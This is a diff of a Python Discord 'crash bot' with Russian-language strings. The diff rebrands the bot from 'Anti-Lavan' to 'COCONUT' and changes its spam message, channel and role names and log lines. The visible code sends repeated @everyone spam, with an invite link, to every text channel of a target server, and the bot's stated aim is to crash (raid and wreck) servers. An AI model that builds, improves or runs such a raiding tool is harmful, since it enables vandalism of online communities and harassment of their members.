@@ -1,10 +1,11 @@
 # -*- coding: utf8 -*-
                         
 cl = """
-   db           w   w      8                           
-  dPYb   8d8b. w8ww w      8    .d88 Yb  dP .d88 8d8b. 
- dPwwYb  8P Y8  8   8 wwww 8    8  8  YbdP  8  8 8P Y8 
-dP    Yb 8   8  Y8P 8      8888 `Y88   YP   `Y88 8   8
+COCONUT CRASH BOT
+=================
+    LOADING
+    
+   СТАБИЛЬНО
                                                           
                                                           """
 print(cl)
@@ -40,9 +41,9 @@ if 'да' in str(echo.lower()):
 else:
     pass
 
-channelname = 'Crash By Anti-Lavan'
-rolename = 'Crashed By Anti-Lavan'
-reasonb = 'Сервер крашнут ботом Anti-Lavan'
+channelname = 'CRASH BY COCONUT'
+rolename = 'CRASHED BY COCONUT'
+reasonb = 'Сервер крашнут ботом Кокоса'
 
 intents = discord.Intents.default()
 intents.members = True
@@ -135,7 +136,7 @@ async def icon(ctx):
 async def sendspam(channel):
         try:
             for _ in range(5):
-                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
+                await channel.send('@everyone / @here\nДанный сервер крашится настоящим ботом Кокоса по ведомым на то причинам. Мой дискорд сервер - https://discord.gg/Xj7J6aBdfN')
         except:
             print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {channel.guild.name} в канал #{channel.name}')
 
@@ -150,7 +151,7 @@ async def spam(ctx):
 
 @client.command()
 async def auto(ctx):
-    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Краш запущен')
+    print(f'{Fore.GREEN}[ LOG ] Сервер {ctx.guild.name} | Взлом жопы начался')
     for channel in ctx.guild.text_channels:
         try:
             asyncio.create_task(sendspam(channel))
@@ -183,7 +184,7 @@ async def auto(ctx):
         print(e)
         print(f'{Fore.RED}Ошибка при работе краша, попробуйте заного.')
     else:
-        print(f'{Fore.GREEN}[ LOG ] Краш сервера {ctx.guild.name}: все потоки краша запущены. Спасибо за использование нашего бота!')
+        print(f'{Fore.GREEN}[ LOG ] Краш сервера {ctx.guild.name}: все потоки краша запущены.')
 
 @client.command()
 async def help(ctx):
@@ -195,5 +196,5 @@ async def help(ctx):
 try:
     client.run(token)
 except:
-    print(f'{Fore.RED}[ ERROR ] Ты ввёл неверный токен бота или не включил ему интенты!')
+    print(f'{Fore.RED}[ ERROR ] Введён неверный токен бота или не включил ему интенты!')
     input()
